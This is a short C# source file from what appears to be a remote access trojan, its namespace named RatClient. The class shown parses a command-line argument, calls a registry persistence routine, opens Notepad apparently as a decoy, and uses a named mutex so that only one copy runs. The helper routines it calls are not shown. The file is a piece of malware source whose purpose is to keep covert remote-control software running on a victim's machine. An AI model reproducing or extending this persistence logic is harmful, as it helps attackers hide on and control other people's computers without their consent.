using System;
using RatClient.Persistence;
using System.Threading;


namespace RatClient.Mtool
{
    public class Assertions
    {
        private string[] args;
        private Mutex mutex = new Mutex(true, "{709da8db-718a-408f-ba51-7d0095a4d237}");

        public Assertions(string[] args)
        {
            this.args = args;
        }

        private void AssertTxtPersist()
        {
            string arg = Tools.ArgsParse("-ptxt", args);
            if (arg != null)
            {
                if (Registrys.PersistTxtfile())
                {
                    NativeMethods.CreateNewProcess("C:\\Windows\\System32\\notepad.exe", arg);
                }
            }
        }

        private void AssertRunOnce()
        {
            if (mutex.WaitOne(TimeSpan.Zero, true))
            {
                return;
            }
            else
            {
                Environment.Exit(1);
            }
        }

        public void AssertAll()
        {
            AssertTxtPersist();
            AssertRunOnce();
        }
    }
}
